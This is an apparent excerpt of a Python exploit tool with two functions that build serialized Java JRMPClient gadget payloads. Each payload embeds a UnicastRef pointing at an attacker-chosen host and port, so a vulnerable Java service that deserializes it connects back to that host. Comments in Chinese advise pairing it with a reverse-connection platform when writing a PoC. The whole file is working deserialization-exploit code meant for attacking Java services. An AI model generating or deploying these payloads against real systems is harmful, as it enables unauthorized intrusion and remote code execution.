def gen_JRMPClient(hostport):
    '''
       写poc的话，用反连平台
    '''
    if ":" not in hostport:
        raise ValueError("JRMPClient need format like: (domain|ip):port")
    else:
        host, port = hostport.split(":", 1)
        if not port.isdigit():
            raise ValueError("port must be digit")
        if len(host) > 0xff - 0x29:
            raise ValueError("host len must less than {}".format(0xff - 0x29))
        START = 0x29
        payload = ""
        payload += binascii.b2a_hex(struct.pack('>B', START + len(host))).decode()  # host len
        payload += "000a556e696361737452656600"
        payload += binascii.b2a_hex(struct.pack('>B', len(host))).decode()  # host len
        payload += binascii.b2a_hex(host.encode()).decode()  # host hex
        payload += "0000"
        payload += binascii.b2a_hex(struct.pack('>H', int(port))).decode()  # port
        payload += "9431fb80"  # random
        payload += "00000000000000000000000000000078"
        return bytes(bytearray.fromhex(payload))


def gen_JRMPClient2(hostport):
    '''
        写poc的话，用反连平台
    '''
    if ":" not in hostport:
        raise ValueError("JRMPClient2 need format like: (domain|ip):port")
    else:
        host, port = hostport.split(":", 1)
        if not port.isdigit():
            raise ValueError("port must be digit")
        if len(host) > 0xff - 0x29:
            raise ValueError("host len must less than {}".format(0xff - 0x29))
        START = 0x29

        payload = ""
        payload += binascii.b2a_hex(struct.pack('>B', START + len(host))).decode()  # host len
        payload += "000a556e696361737452656600"
        payload += binascii.b2a_hex(struct.pack('>B', len(host))).decode()  # host len
        payload += binascii.b2a_hex(host.encode()).decode()  # host hex
        payload += "0000"
        payload += binascii.b2a_hex(struct.pack('>H', int(port))).decode()  # port
        payload += "00000000"
        payload += "9431fb80"  # random
        payload += "00000000000000000000000000000078"
        return bytes(bytearray.fromhex(payload))


